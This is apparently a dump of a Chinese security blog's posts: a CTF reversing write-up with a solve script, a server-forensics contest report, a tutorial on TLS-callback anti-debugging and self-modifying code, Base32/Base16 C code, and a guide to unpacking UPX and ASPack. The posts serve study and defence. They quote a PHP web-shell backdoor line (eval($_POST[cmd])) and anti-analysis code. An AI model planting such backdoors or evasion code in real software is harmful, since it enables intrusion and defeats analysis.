re.compile(pat)str1 = reg.findall(t)for i in range(len(str1)): t = t.replace(str1[i], 'str1')pat = r'([O0]&#123;17&#125;)=2002'reg = re.compile(pat)str2 = reg.findall(t)for i in range(len(str2)): t = t.replace(str2[i], 'str2')pat = r'([O0]&#123;17&#125;)=2003'reg = re.compile(pat)str3 = reg.findall(t)for i in range(len(str3)): t = t.replace(str3[i], 'str3')pat = r'([O0]&#123;17&#125;)=2004'reg = re.compile(pat)str4 = reg.findall(t)for i in range(len(str4)): t = t.replace(str4[i], 'str4')# restpat = r'([O0]&#123;17&#125;)'reg = re.compile(pat)rest = reg.findall(t)rest = list(set(rest))for i in range(len(rest)): t = t.replace(rest[i], 'x&#123;&#125;'.format(str(i)))f = open('play.py', 'wb')f.write(t)f.close() key content (purpose) 1000 return address (mostly int, but object is theoretically possible) 1001 return value (mostly int, but object is theoretically possible) 2001, 2002, 2003, 2004 instruction argument (== oparg) (always byte array) 以上几个数字判断对应几个key。然后逐个函数判断指令功能。这里放一下ppp大佬给的分析脚本。记录一下Balsn大佬们给的加密过程如下： 1234567891011121314151617181920212223242526#!/usr/bin/env pythondef encrypt(x): a = x &gt;&gt; 32 a ^= 0xffc2bdec a += 0xffc2bdec a &amp;= 0xffffffff b = x &amp; 0xffffffff b ^= 0xffc2bdec b += 0xffc2bdec b &amp;= 0xffffffff c = ((b &lt;&lt; 32) | a)&amp;0xffffffffffffffff d = ((c &amp; 0x7f) &lt;&lt; 57)&amp;0xffffffffffffffff return ((c &gt;&gt; 7) | d) &amp; 0xffffffffffffffffflag = str(input())flag = int('0x' + flag.encode('hex'), 16)for i in range(0x7f): flag = encrypt(flag)print hex(flag)assert flag == 0xd274a5ce60ef2dca Balsn大佬们的solve脚本： 1234567891011121314#!/usr/bin/env pythondef decrypt(x): c = ((x &lt;&lt; 7) | (x &gt;&gt; 57))&amp;0xffffffffffffffff b = ((((c &gt;&gt; 32)&amp;0xffffffff)-0xffc2bdec)&amp;0xffffffff)^0xffc2bdec a = (((c&amp;0xffffffff)-0xffc2bdec)&amp;0xffffffff)^0xffc2bdec return ((a &lt;&lt; 32) | b)&amp;0xffffffffffffffffflag = 0xd274a5ce60ef2dcafor i in xrange(0x7f): flag = decrypt(flag)print hex(flag)print hex(flag)[2:-1:].decode('hex') 参考网站https://lordidiot.github.io/2019-01-27/codegate-junior-quals-2019/https://tcode2k16.github.io/blog/posts/2019-01-27-codegate-qualifier-writeup/https://blog.csdn.net/u010376788/article/details/49764205https://blog.pspaul.de/posts/codegate-pre-2019-pyprot3ct/https://devel0pment.de/?p=1179https://ctftime.org/writeup/12955https://balsn.tw/ctf_writeup/20190126-codegatectf/https://github.com/leesh3288/CTF/blob/master/2019/CODEGATE/mini%20converter/mini_converter_writeup.mdhttps://blog.metamon.xyz/2019/01/31/codegate-2019-qual-writeup/https://github.com/pwning/public-writeup/tree/master/codegate2019/pyprot3ct","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"review","slug":"review","permalink":"https://qianfei11.github.io/tags/review/"}]},{"title":"2018-安恒杯十二月月赛-writeup","slug":"【未完成】2018-安恒杯十二月月赛-writeup","date":"2019-01-25T08:12:19.000Z","updated":"2019-02-01T12:11:22.387Z","comments":true,"path":"2019/01/25/【未完成】2018-安恒杯十二月月赛-writeup/","link":"","permalink":"https://qianfei11.github.io/2019/01/25/【未完成】2018-安恒杯十二月月赛-writeup/","excerpt":"记录两道pwn题。","text":"记录两道pwn题。 messageb0x基础的栈溢出。 smallorange","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"https://qianfei11.github.io/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"2018-信息安全铁人三项赛总决赛-数据赛-writeup","slug":"2018-信息安全铁人三项赛总决赛-数据赛-writeup","date":"2018-12-08T11:44:17.000Z","updated":"2018-12-09T07:15:18.819Z","comments":true,"path":"2018/12/08/2018-信息安全铁人三项赛总决赛-数据赛-writeup/","link":"","permalink":"https://qianfei11.github.io/2018/12/08/2018-信息安全铁人三项赛总决赛-数据赛-writeup/","excerpt":"第一次参加铁三，这次总决赛中的数据赛不再是之前的看数据包，而是直接给了一台web服务器溯源。","text":"第一次参加铁三，这次总决赛中的数据赛不再是之前的看数据包，而是直接给了一台web服务器溯源。 经验总结第一次接触，全队也就自己一个人在做，挖了坑也填了坑，记录一下。 服务器给的是命令行界面，不用想着变成图形界面来操作。因为我init 5变成图形界面后发现完全没法操作…后来为了变回去我误以为是init 0，直接把服务器关了…后来只能让让主办方帮忙重启一下，差点被扣分… 刚开始的时候我主要目标是在每个用户的家目录以及web服务的根目录下查看是否有一些隐藏文件，\b还是可以收集到一些重要信息的。 然后在数据库的目录下也可以发现一些信息。 之后慢慢发现最重要其实是web服务下的一些log文件，记录了黑客对服务器攻击的主要过程。 后来我还发现在每个用户家目录下的.bash_history也是很有用的，可以看到黑客提权后干的事情。 查看文件的话，建议用less -mN filename，因为纯命令行的界面不能滚屏，用less就会方便很多。 刚登上服务器建议lastlog一下，看看除了root用户之外其他用户最后一次是什么时候登陆的。 其他命令的话，常用grep肯定是没错的… 然后比赛的时候也找了两篇关于服务器溯源的文章，记录一下： https://www.freebuf.com/articles/web/138867.html https://www.freebuf.com/articles/rookie/179638.html 比赛的时候因为我们队排名在后来不是很靠前，然后我信息的收集也不是很到位，第一题怕做错会扣分，万一我们连三等奖都拿不到了，就没敢做。比赛结束后才知道每个队伍都会获奖… \b溯源过程记录题目差不多是这样：黑客在内网中拿到了两台肉鸡，然后通过这两台肉鸡对一台服务器进行了攻击，我们则需要对这台服务器溯源取证分析，并且找到黑客留下的后门。 刚拿到服务器，先在\b在root的家目录下查看了一下隐藏文件，没想到一下子就有收获： 在这里一下子就拿到了数据库的账号和密码。 然后尝试登陆一下数据库，发现有一个seacms的数据库，然后进去之后发现一些重要的信息： 看完数据库，我就去查了一下关于海洋cms的洞： https://www.freebuf.com/vuls/150042.html https://www.jianshu.com/p/ebf156afda49 大概知道了是在web根目录下的search.php中存在漏洞，然后通过分析黑客可能用来攻击的脚本，大概知道了攻击过程。 我这里还把search.php记录下来了： 在web目录下还看到了一个360safe，就截了张图： 然后我看了一下每个用户家目录下的.bash_history，正常的用户simple以及黑客创建的hacker都没啥，主要是root的.bash_history： 大概收集了这些，也能推断出黑客拿到权限后新建了一个叫hacker的用户，然后黑客的操作是从什么时候开始的也无法判断。再grep一下： 下一步我就开始看日志，通过对.bash_history的阅读，判断主要是在/var/log/httpd下和/var/www/html/logs下的log文件： 然后就开始对log文件一行一行看下来： 基本看到几个ip： 在后面一点的时候会看到192.168.12.173，通过GET的url很容易判断出在用脚本打网站： 最后看到可以黑客在放后门eval($_POST[cmd])： 大概的分析就是这样，中间也踩了很多坑。我最后的判断是： IP IDENTITY OPERATING SYSTEM 192.168.31.119 admin windows 192.168.12.129 victim windows 192.168.12.173 bot windows 192.168.12.156 bot windows 192.168.12.125 bot android 192.168.31.73 bot android 感觉自己整体分析下来应该方向是没错的，可能因为自己没学过计网，对一些网络的\b协议和请求方式没有了解很透彻，导致比赛的时候第一题问两台肉鸡的ip就判断错了，然后就没敢做下去…","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"https://qianfei11.github.io/tags/wp/"}]},{"title":"绕过TLS（Thread Local Storage）和SMC（Self Modifying Code）保护","slug":"绕过TLS（Thread Local Storage）和SMC（Self Modifying Code）保护","date":"2018-12-08T04:37:41.000Z","updated":"2019-02-03T10:26:10.704Z","comments":true,"path":"2018/12/08/绕过TLS（Thread Local Storage）和SMC（Self Modifying Code）保护/","link":"","permalink":"https://qianfei11.github.io/2018/12/08/绕过TLS（Thread Local Storage）和SMC（Self Modifying Code）保护/","excerpt":"main函数前有什么？","text":"main函数前有什么？ TLS什么是TLSTLS（Thread Local Storage）回调函数是每当创建/终止进程的线程时会自动调用执行的函数。创建的主线程也会自动调用回调函数，且其调用执行先于EP（Entry Point）代码。功能就是把PE文件的TEXT段进行加密，隐藏他的静态代码段特性，在运行的时候抢在main函数执行之前把代码段直接在内存里面解密（不然就崩溃了），从而达到静态代码隐藏功能。 编写TLS123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;windows.h&gt; #include&lt;stdio.h&gt;#include &lt;winnt.h&gt; #include &lt;stdlib.h&gt;#include &lt;tlhelp32.h&gt;//使用tls 回调函数//使用TLS 的宏#pragma comment(linker, \"/INCLUDE:__tls_used\")void lookupprocess() &#123; PROCESSENTRY32 pe32; pe32.dwSize = sizeof(pe32); HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // 在快照中包含系统中所有的进程 BOOL bMore = Process32First(hProcessSnap, &amp;pe32); // 获得第一个进程的句柄 while (bMore) &#123; _wcslwr_s(pe32.szExeFile, wcslen(pe32.szExeFile)+1); if (!wcscmp(pe32.szExeFile, L\"ollyice.exe\")) &#123; printf(\"///////WARNING///////\\n\"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L\"ollydbg.exe\")) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L\"peid.exe\")) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L\"ida.exe\")) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L\"idaq.exe\")) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125; bMore = Process32Next(hProcessSnap, &amp;pe32); // 获取下一个进程的句柄 &#125; CloseHandle(hProcessSnap);&#125;void Debugger(void) &#123; int result = 0; __asm &#123; mov eax, dword ptr fs:[30h]//TEB偏移30H处 movzx eax, byte ptr ds:[eax + 2h]//取PEB中BeingDebug，若为1则被调试 mov result, eax &#125; if (result) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125;&#125;void NTAPI tls_callback(PVOID h, DWORD reason, PVOID pv) &#123; lookupprocess(); Debugger(); MessageBox(NULL, L\"Not_Main_this_is_tls!\", L\"tls\", MB_OK); return;&#125;#pragma data_seg(\".CRT$XLB\")PIMAGE_TLS_CALLBACK p_thread_callback[] = &#123; tls_callback, 0 &#125;;#pragma data_seg()int main() &#123; MessageBox(NULL, L\"Main!\", L\"ESE\", MB_OK); return 0;&#125; 调试TLS把有TLS保护的程序拖进ida分析，会看到main函数其实是空的： 1234int __cdecl main(int argc, const char **argv, const char **envp)&#123; return 0;&#125; 在start（也就是entry point）处下断点调试： 发现程序依然执行了，说明程序在entry point之前运行了。 同时可以查看entry point list（Ctrl+E），发现ida也已经反编译出了一个叫做TlsCallback_0()的函数： 查看一下该函数的反汇编代码： 12345678void __stdcall TlsCallback_0(int a1, int a2, int a3)&#123; if ( a2 == 1 ) &#123; MessageBoxA(0, Text, Caption, 0); ExitProcess(0); &#125;&#125; 这也是许多未知程序在逆向时，更建议在虚拟环境下运行的原因。 手动去除TLSTlsCallback函数的定义： 1234567891011typedef VOID(NTAPI *PIMAGE_TLS_CALLBACK) ( PVOID DllHandle, // 模块句柄，即加载地址 DWORD Reason, PVOID Reserved );其中reason有以下几种：(winNT.h)#define DLL_PROCESS_ATTACH 1 // 进程启动#define DLL_THREAD_ATTACH 2 // 线程启动#define DLL_THREAD_DETACH 3 // 线程退出#define DLL_PROCESS_DETACH 0 // 进程退出 可以参照之前写过的一片writeup：https://qianfei11.github.io/2018/05/07/2018-ZJGSCTF-writeup/#New-driver SMC什么是SMCSMC（Self Modifying Code）是一种将可执行文件中的代码或数据进行加密，防止别人使用逆向工程工具（比如一些常见的反汇编工具）对程序进行静态分析的方法，只有程序运行时才对代码和数据进行解密，从而正常运行程序和访问数据。计算机病毒通常也会采用SMC技术动态修改内存中的可执行代码来达到变形或对代码加密的目的，从而躲过杀毒软件的查杀或者迷惑反病毒工作者对代码进行分析。现在，很多加密软件（或者称为“壳”程序）为了防止Cracker（破解者）跟踪自己的代码，也采用了动态代码修改技术对自身代码进行保护。要精准的定位某个函数非常麻烦，所以我们就要以区块为加密的基础单位。 12345void encrypt_func(char *start_addr, int len) &#123; for(int i = 0; i &lt; len; i++) &#123; *(start + i) ^= 0x88; &#125;&#125; 编写SMC因为定位一个具体的函数很繁琐，所以我们选择直接定位一个节表。把敏感的代码放入节表中，然后在需要的时候进行解密，这就是SMC动态加密技术的精髓。将下面这行代码放在开始程序的开始（也就是include下面），主要是让text节区可以执行、读、写和分享： 1#pragma comment(linker, \"/SECTION:.text,ERWS\") 以下代码可以编译生成可执行文件，但是无法运行，因为ck()函数的地址已经被打乱。这时候就利用OD进行修改，载入生成的程序，当程序运行enccrpt_func()函数完成时，ck()就已经完成加密，然后将程序dump下来，这时就可以运行。若拿一开始的程序去静态看，是完全看不懂的。 1234567891011121314151617181920212223242526272829#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#pragma comment(linker, \"/SECTION:.text,ERWS\")void encrypt_func(char *start_addr, int len) &#123; for(int i = 0; i &lt; len; i++) &#123; //这里对地址进行简单的加密&gt; *(start + i) ^= 0x88; &#125;&#125;//需要保护的函数void ck() &#123; printf(\"this is a test of smc\");&#125;//加密数据结束的地址void end()&#123;&#125;int main() &#123; char *lp_s = 0; char *lp_e = 0; int len = 0; lp_s = (char *)ck; //获取需要加密函数的起始地址 lp_e = (char *)end; //获取需要加密函数的结束地址 len = lp_e - lp_s; enc(lp_s, len); //smc加密函数 ck();&#125; 解密SMC 找到smc的加密函数，当运行完成smc解密函数时,将程序dump下来。 smc对程序动态完全没有用，可以用OD来调试程序，找到受保护代码。 参考网站http://www.hexblog.com/?p=9http://www.voidcn.com/article/p-etaovjqz-bao.htmlhttp://www.uml.org.cn/c++/200710313.asphttps://esebanana.github.io/2018/04/08/re_10_tls_smc/http://www.voidcn.com/article/p-etaovjqz-bao.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"}]},{"title":"C语言实现Base32和Base16解密加密算法","slug":"C语言实现Base32和Base16解密加密算法","date":"2018-12-04T14:04:09.000Z","updated":"2018-12-05T08:15:28.195Z","comments":true,"path":"2018/12/04/C语言实现Base32和Base16解密加密算法/","link":"","permalink":"https://qianfei11.github.io/2018/12/04/C语言实现Base32和Base16解密加密算法/","excerpt":"承接之前Base64的文章，实现了一下Base32和Base16，原理是一样的。","text":"承接之前Base64的文章，实现了一下Base32和Base16，原理是一样的。 Base32加解密实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131#include&lt;cstdio&gt;#include&lt;cstdlib&gt;#include&lt;cstring&gt;#define MAX 100const char *base32payload = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=\";int find_pos(char c) &#123; for(int i = 0; i &lt; 31; i++) &#123; if(c == base32payload[i]) &#123; return i; &#125; &#125; return -1;&#125;unsigned char *base32_encode(const char *s, const int len) &#123; unsigned int sign = len % 5; unsigned int res_len = len % 5 ? ((len) / 5 + 1) * 8 : (len) / 5 * 8; unsigned int i = 0, j = 0; unsigned char *res = (unsigned char *)malloc(res_len + 1); memset(res, 0, res_len + 1); for(i = 0, j = 0; i &lt; len; i += 5, j += 8) &#123; if(i + 4 &gt;= len) &#123; res[j] = (s[i] &gt;&gt; 3) &amp; 0x1F; if(sign == 1) &#123; res[j + 1] = (s[i] &lt;&lt; 2) &amp; 0x1C; res[j + 2] = 0x20; res[j + 3] = 0x20; res[j + 4] = 0x20; res[j + 5] = 0x20; res[j + 6] = 0x20; res[j + 7] = 0x20; break; &#125; else if(sign == 2) &#123; res[j + 1] = ((s[i] &lt;&lt; 2) &amp; 0x1C) | ((s[i + 1] &gt;&gt; 3) &amp; 0x18); res[j + 2] = (s[i + 1] &gt;&gt; 1) &amp; 0x1F; res[j + 3] = (s[i + 1] &lt;&lt; 4) &amp; 0x10; res[j + 4] = 0x20; res[j + 5] = 0x20; res[j + 6] = 0x20; res[j + 7] = 0x20; break; &#125; else if(sign == 3) &#123; res[j + 1] = ((s[i] &lt;&lt; 2) &amp; 0x1C) | ((s[i + 1] &gt;&gt; 3) &amp; 0x18); res[j + 2] = (s[i + 1] &gt;&gt; 1) &amp; 0x1F; res[j + 3] = ((s[i + 1] &lt;&lt; 4) &amp; 0x10) | ((s[i + 2] &gt;&gt; 4) &amp; 0x0F); res[j + 4] = (s[i + 2] &lt;&lt; 1) &amp; 0x1E; res[j + 5] = 0x20; res[j + 6] = 0x20; res[j + 7] = 0x20; break; &#125; else if(sign == 4) &#123; res[j + 1] = ((s[i] &lt;&lt; 2) &amp; 0x1C) | ((s[i + 1] &gt;&gt; 3) &amp; 0x18); res[j + 2] = (s[i + 1] &gt;&gt; 1) &amp; 0x1F; res[j + 3] = ((s[i + 1] &lt;&lt; 4) &amp; 0x10) | ((s[i + 2] &gt;&gt; 4) &amp; 0x0F); res[j + 4] = ((s[i + 2] &lt;&lt; 1) &amp; 0x1E) | ((s[i + 3] &gt;&gt; 3) &amp; 0x10); res[j + 5] = (s[i + 3] &gt;&gt; 2) &amp; 0x1F; res[j + 6] = (s[i + 3] &lt;&lt; 3) &amp; 0x18; res[j + 7] = 0x20; break; &#125; &#125; res[j] = (s[i] &gt;&gt; 3) &amp; 0x1F; res[j + 1] = ((s[i] &lt;&lt; 2) &amp; 0x1C) | ((s[i + 1] &gt;&gt; 6) &amp; 0x03); res[j + 2] = (s[i + 1] &gt;&gt; 1) &amp; 0x1F; res[j + 3] = ((s[i + 1] &lt;&lt; 4) &amp; 0x10) | ((s[i + 2] &gt;&gt; 4) &amp; 0x0F); res[j + 4] = ((s[i + 2] &lt;&lt; 1) &amp; 0x1E) | ((s[i + 3] &gt;&gt; 3) &amp; 0x10); res[j + 5] = (s[i + 3] &gt;&gt; 2) &amp; 0x1F; res[j + 6] = ((s[i + 3] &lt;&lt; 3) &amp; 0x18) | ((s[i + 4] &gt;&gt; 5) &amp; 0x07); res[j + 7] = s[i + 4] &amp; 0x1F; &#125; for(j = 0; j &lt; res_len; j++) &#123; res[j] = base32payload[res[j]]; &#125; return res;&#125;unsigned char *base32_decode(const char *s, const int len) &#123; unsigned int res_len = len / 8 * 5; unsigned int i = 0, j = 0; unsigned char *res = (unsigned char *)malloc(res_len + 1); memset(res, 0, res_len + 1); int count = len / 8; for(i = 0; i &lt; count; i++) &#123; int s_index = i * 8; int res_index = i * 5; int buffer[8]; int sign = 0; for(j = 0; j &lt; 8; j++) &#123; buffer[j] = find_pos(s[s_index + j]); &#125; if(i == count - 1) &#123; for(j = 0; j &lt; 8; j++) &#123; if(buffer[j] == 0x20) &#123; sign++; &#125; &#125; &#125; res[res_index] = ((buffer[0] &amp; 0x1F) &lt;&lt; 3) | ((buffer[1] &amp; 0x1C) &gt;&gt; 2); if(sign == 4) &#123; break; &#125; res[res_index + 1] = ((buffer[1] &amp; 0x03) &lt;&lt; 6) | ((buffer[2] &amp; 0x1F) &lt;&lt; 1) | ((buffer[3] &amp; 0x10) &gt;&gt; 4); if(sign == 3) &#123; break; &#125; res[res_index + 2] = ((buffer[3] &amp; 0x0F) &lt;&lt; 4) | ((buffer[4] &amp; 0x1E) &gt;&gt; 1); if(sign == 2) &#123; break; &#125; res[res_index + 3] = ((buffer[4] &amp; 0x01) &lt;&lt; 7) | ((buffer[5] &amp; 0x1F) &lt;&lt; 2) | ((buffer[6] &amp; 0x18) &gt;&gt; 3); if(sign == 1) &#123; break; &#125; res[res_index + 4] = ((buffer[6] &amp; 0x07) &lt;&lt; 5) | (buffer[7] &amp; 0x1F); &#125; return res;&#125;int main() &#123; unsigned char s1[MAX]; scanf(\"%s\", s1); unsigned char *s2 = base32_encode((const char *)s1, strlen((const char *)s1)); printf(\"%s\\n\", s2); unsigned char *s3 = base32_decode((const char *)s2, strlen((const char *)s2)); printf(\"%s\\n\", s3); free(s2); free(s3); return 0;&#125; Base16加解密实现Base16编码使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码。Base16先获取输入字符串每个字节的二进制值（不足8比特在高位补0），然后将其串联进来，再按照4比特一组进行切分，将每组二进制数分别转换成十进制，在下述表格中找到对应的编码串接起来就是Base16编码。可以看到8比特数据按照4比特切分刚好是两组，所以Base16不可能用到填充符号“=”。 简单来说，Base16编码是一个标准的十六进制字符串。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#include&lt;cstdio&gt;#include&lt;cstdlib&gt;#include&lt;cstring&gt;#define MAX 100const char *base16payload = \"0123456789ABCDEF=\";int find_pos(char c) &#123; for(int i = 0; i &lt; 15; i++) &#123; if(c == base16payload[i]) &#123; return i; &#125; &#125; return -1;&#125;unsigned char *base16_encode(const char *s, const int len) &#123; unsigned int sign = len % 4; unsigned int res_len = len * 2; unsigned int i = 0, j = 0; unsigned char *res = (unsigned char *)malloc(res_len + 1); memset(res, 0, res_len + 1); for(i = 0, j = 0; i &lt; len; i += 4, j += 8) &#123; if(i + 4 &gt;= len) &#123; res[j] = (s[i] &gt;&gt; 4) &amp; 0x0F; if(sign == 1) &#123; res[j + 1] = s[i] &amp; 0x0F; res[j + 2] = 0x10; res[j + 3] = 0x10; res[j + 4] = 0x10; res[j + 5] = 0x10; res[j + 6] = 0x10; res[j + 7] = 0x10; break; &#125; else if(sign == 2) &#123; res[j + 1] = s[i] &amp; 0x0F; res[j + 2] = (s[i + 1] &gt;&gt; 4) &amp; 0x0F; res[j + 3] = s[i + 1] &amp; 0x0F; res[j + 4] = 0x10; res[j + 5] = 0x10; res[j + 6] = 0x10; res[j + 7] = 0x10; break; &#125; else if(sign == 3) &#123; res[j + 1] = s[i] &amp; 0x0F; res[j + 2] = (s[i + 1] &gt;&gt; 4) &amp; 0x0F; res[j + 3] = s[i + 1] &amp; 0x0F; res[j + 4] = (s[i + 2] &gt;&gt; 4) &amp; 0x0F; res[j + 5] = s[i + 2] &amp; 0x0F; res[j + 6] = 0x10; res[j + 7] = 0x10; break; &#125; &#125; res[j] = (s[i] &gt;&gt; 4) &amp; 0x0F; res[j + 1] = s[i] &amp; 0x0F; res[j + 2] = (s[i + 1] &gt;&gt; 4) &amp; 0x0F; res[j + 3] = s[i + 1] &amp; 0x0F; res[j + 4] = (s[i + 2] &gt;&gt; 4) &amp; 0x0F; res[j + 5] = s[i + 2] &amp; 0x0F; res[j + 6] = (s[i + 3] &gt;&gt; 4) &amp; 0x0F; res[j + 7] = s[i + 3] &amp; 0x0F; &#125; for(j = 0; j &lt; res_len; j++) &#123; res[j] = base16payload[res[j]]; &#125; return res;&#125;unsigned char *base16_decode(const char *s, const int len) &#123; unsigned int res_len = len / 2; unsigned int i = 0, j = 0; unsigned char *res = (unsigned char *)malloc(res_len + 1); memset(res, 0, res_len + 1); int count = len / 8; for(i = 0; i &lt; count; i++) &#123; int s_index = i * 8; int res_index = i * 4; int buffer[8]; for(j = 0; j &lt; 8; j++) &#123; buffer[j] = find_pos(s[s_index + j]); &#125; int sign; if(i == count - 1) &#123; for(j = 0; j &lt; 8; j++) &#123; if(buffer[j] == 0x10) &#123; sign++; &#125; &#125; &#125; res[res_index] = ((buffer[0] &amp; 0x0F) &lt;&lt; 4) | (buffer[1] &amp; 0x0F); if(sign == 3) &#123; break; &#125; res[res_index + 1] = ((buffer[2] &amp; 0x0F) &lt;&lt; 4) | (buffer[3] &amp; 0x0F); if(sign == 2) &#123; break; &#125; res[res_index + 2] = ((buffer[4] &amp; 0x0F) &lt;&lt; 4) | (buffer[5] &amp; 0x0F); if(sign == 1) &#123; break; &#125; res[res_index + 3] = ((buffer[6] &amp; 0x0F) &lt;&lt; 4) | (buffer[7] &amp; 0x0F); &#125; return res;&#125;int main() &#123; unsigned char s1[MAX]; scanf(\"%s\", s1); unsigned char *s2 = base16_encode((const char *)s1, strlen((const char *)s1)); printf(\"%s\\n\", s2); unsigned char *s3 = base16_decode((const char *)s2, strlen((const char *)s2)); printf(\"%s\\n\", s3); free(s2); free(s3); return 0;&#125;","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://qianfei11.github.io/tags/crypto/"},{"name":"c","slug":"c","permalink":"https://qianfei11.github.io/tags/c/"}]},{"title":"脱壳指南","slug":"【未完成】脱壳指南","date":"2018-11-29T09:04:10.000Z","updated":"2019-02-18T09:09:41.427Z","comments":true,"path":"2018/11/29/【未完成】脱壳指南/","link":"","permalink":"https://qianfei11.github.io/2018/11/29/【未完成】脱壳指南/","excerpt":"记录一下脱一些简单壳的过程（主要是找OEP）。","text":"记录一下脱一些简单壳的过程（主要是找OEP）。 使用工具 调试工具：Ollydbg 查壳工具：ExeInfo/PEID 脱壳工具：LordPE、ImportRE OD快捷键： 快捷键 功能 f7 单步步入 f8 单步步过 f4 运行到选定位置 f2 设置断点 ctrl+f2 重新开始 f9 运行 shift+f9 忽略异常运行 alt+f9 执行到用户代码 脱壳LordPELordPE用来将程序dump出来： 找到程序右键，修正镜像大小； 完整转存。 ImportRECImportREC用来修改OEP和一些IAT： 找到程序，输入找到的OEP的值； 点击IAT自动搜索； 获取导入表； 显示无效的，如果有无效的表清除即可； 修正转储。 了解了脱壳的方法后，我们需要做的就是找到OEP。 压缩壳压缩壳的特点是减小软件体积大小，主要目的起对软件的压缩，加密保护不是重点。例如：UPX、ASPack等等。 UPX（the Ultimate Packer for eXecutables）是一个免费且开源的可执行程序文件加壳器，支持许多不同操作系统下的可执行文件格式。 ASPack是一种可压缩32位WindowsEXE文件与DLL文件的压缩工具，能将大多数EXE文件及DLL文件平均压缩百分之三十到四十的压缩率。 kkrunchy是一个64K Demo专用的压缩工具，压缩率非常高。 NSPack是一款支持EXE/DLL/OCX/SCR等类型的文件进行压缩。可以兼容64位操作系统。 PECompact是一款能压缩可执行文件（后缀为EXE）的压缩加壳工具，压缩率极高，压缩后的程序无需解压即可直接运行，通过压缩代码、数据、相关资源使压缩能达到100%。 单步执行法以UPX为例。单步执行法，通过单步执行一步一步，找到OEP（程序入口点）。如果遇到向下的跳转则默认跳转： 遇到向上的跳转则直接执行到下一条语句，即f4： 最后执行到popad处会有一个大范围的jmp，即转到OEP。 ESP定律法以UPX为例。利用压缩前后ESP不变的定律。在指令pushad时单步一下，会发现寄存器中只有ESP发生变化： 然后右键ESP的值，跟随数据窗口： \b再在数据窗口中硬件访问，设下断点： 同样也可以通过dd xxxxxxxx或者hr xxxxxxxx设下硬件断点，在下方command处输入： 然后f9继续执行到popad后，删去硬件断点： f7到达OEP。 特殊的ESP定律法以FSG2.0为例。不遵循ESP不变的定律，FSG2.0专用的方法。单步走到popad的下一条指令，观察堆栈窗口从上往下数第四个地址的值即为OEP的地址。右键在反汇编窗口跟随： 下硬件断点后f9运行，到达OEP。 二次内存镜像法以UPX为例。进入内存段中，先找到程序段的第一个.rsrc，并设下断点后执行： 再在内存段中的0x00401000处设下断点，再执行 然后按照单步执行法往下走就能看到popad还有jmp： 一步直达法以UPX为例。在遇到指令pushad后，通过经验可以判断必存在popad，直接搜索指令找到OEP： 模拟跟踪法以ASPack为例。先进入内存中，找到SFX： 在命令框输入tc eip&lt;xxxxxxxx： 会看到OD左上角变成了跟踪： 等待一段时间就会跳转到OEP。 SFX模拟跟踪法以ASPack为例。进入选项-&gt;调试设置（Alt+O）： 一般情况选择块方式跟踪或者字节方式，这里选择前者： 确定后，重新载入（Ctrl+f2），直接跳到了OEP。 最后一次异常法以PECompact为例。先在调试选项中忽略所有异常： 重新载入后，执行m次shift+f9，直到程序跑飞。然后重新载入程序，执行m-1次shift+f9。在堆栈窗口中找到SE句柄，然后ctrl+g转到SE句柄： 1234567891011120045DE74 B8 F9CB45F0 mov eax,0xF045CBF90045DE79 8D88 9E120010 lea ecx,dword ptr ds:[eax+0x1000129E]0045DE7F 8941 01 mov dword ptr ds:[ecx+0x1],eax0045DE82 8B5424 04 mov edx,dword ptr ss:[esp+0x4]0045DE86 8B52 0C mov edx,dword ptr ds:[edx+0xC]0045DE89 C602 E9 mov byte ptr ds:[edx],0xE90045DE8C 83C2 05 add edx,0x50045DE8F 2BCA sub ecx,edx ; ntdll_1.7720353D0045DE91 894A FC mov dword ptr ds:[edx-0x4],ecx ; qqspirit.0045DE740045DE94 33C0 xor eax,eax0045DE96 C3 retn0045DE97 B8 78563412 mov eax,0x12345678 ; 下断点 随后执行到断点处，单步跟到OEP。 加密壳加密壳主要就是针对软件的加密保护，也有一些人用加密壳来做一些木马的免杀，导致一些杀软件查到该壳就误报病毒。加密壳的种类有很多，如果手工脱和修复，即使对高手来脱，也需要费很大力气。 修复有时候脱完壳却不能运行程序，需要修复IAT。首先载入OD，在OEP往下找call： 找到后在命令框处输入d xxxxxx： 在数据窗口中，往上查找，直到数据为0，记录下IAT地址；往下也同样： 在ImportREC中修改OEP后，不采取自动获取的方式，手动输入IAT起始地址和大小，偷懒的办法是大小直接输1000： 然后清除掉无效的，转储一下得到完整程序。 